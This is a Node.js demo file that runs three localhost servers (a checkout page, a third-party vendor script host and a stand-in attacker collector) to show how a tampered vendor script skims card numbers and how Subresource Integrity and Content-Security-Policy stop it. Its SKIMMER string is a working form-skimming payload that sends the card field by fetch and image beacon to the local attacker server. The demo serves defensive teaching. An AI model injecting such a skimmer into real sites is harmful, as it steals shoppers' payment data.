// Three tiny servers on localhost, so the whole story runs on one machine and nothing leaves it:
//   site     :3100  a checkout page that loads a third-party script
//   vendor   :3101  the third party that serves that script (clean, tampered, or "legit update")
//   attacker :3102  records anything a malicious script sends it (a local stand-in, not a real service)
const http = require('http');
const crypto = require('crypto');

const PORTS = { site: 3100, vendor: 3101, attacker: 3102 };

const CLEAN = `/* vendor chat widget v1 */
window.__vendorLoaded = true;
document.getElementById('chat').textContent = 'Chat: online';
`;
const UPDATED = CLEAN.replace('v1', 'v2'); // a normal, honest update from the vendor (different bytes)
const SKIMMER = CLEAN + `
/* injected: copy the card field to the attacker */
const send = () => {
  const v = document.getElementById('card').value;
  if (!v) return;
  fetch('http://localhost:${PORTS.attacker}/steal', { method: 'POST', mode: 'no-cors', body: v }).catch(() => {});
  new Image().src = 'http://localhost:${PORTS.attacker}/steal?d=' + encodeURIComponent(v);
};
document.getElementById('card').addEventListener('input', send);
document.getElementById('pay').addEventListener('click', send);
`;

const sri = (src) => 'sha384-' + crypto.createHash('sha384').update(src).digest('base64');

const state = { vendor: 'clean', pinned: sri(CLEAN), stolen: [] };

function page(defense) {
  const useSri = defense === 'sri' || defense === 'both';
  const attrs = useSri ? ` integrity="${state.pinned}" crossorigin="anonymous"` : '';
  return `<!doctype html><meta charset="utf-8"><title>Checkout</title>
<h1>Checkout</h1><p id="chat">Chat: offline</p>
<input id="card" placeholder="card number"><button type="button" id="pay">Pay</button>
<script src="http://localhost:${PORTS.vendor}/vendor.js"${attrs}></script>`;
}

function start() {
  const site = http.createServer((req, res) => {
    const defense = new URL(req.url, 'http://x').searchParams.get('defense') || 'none';
    const headers = { 'Content-Type': 'text/html' };
    if (defense === 'csp' || defense === 'both') {
      // Only allow connections and images back to this site. The script may still RUN, but it can not phone home.
      headers['Content-Security-Policy'] = `default-src 'self'; script-src 'self' http://localhost:${PORTS.vendor}; connect-src 'self'; img-src 'self'`;
    }
    res.writeHead(200, headers); res.end(page(defense));
  });
  const vendor = http.createServer((req, res) => {
    const body = state.vendor === 'tampered' ? SKIMMER : state.vendor === 'updated' ? UPDATED : CLEAN;
    res.writeHead(200, { 'Content-Type': 'application/javascript', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' }); res.end(body);
  });
  const attacker = http.createServer((req, res) => {
    let data = ''; req.on('data', (c) => (data += c));
    req.on('end', () => { state.stolen.push(data || new URL(req.url, 'http://x').searchParams.get('d')); res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
  });
  site.listen(PORTS.site); vendor.listen(PORTS.vendor); attacker.listen(PORTS.attacker);
  return { state, PORTS, close: () => { site.close(); vendor.close(); attacker.close(); site.closeAllConnections(); vendor.closeAllConnections(); attacker.closeAllConnections(); } };
}

module.exports = { start, sri, CLEAN, SKIMMER, UPDATED };

if (require.main === module) {
  const s = start();
  console.log(`site     http://localhost:${PORTS.site}/?defense=none|sri|csp|both\nvendor   http://localhost:${PORTS.vendor}/vendor.js\nattacker http://localhost:${PORTS.attacker}  (records stolen values)`);
  console.log('Press Ctrl+C to stop. Set state from code, see test.js.');
}
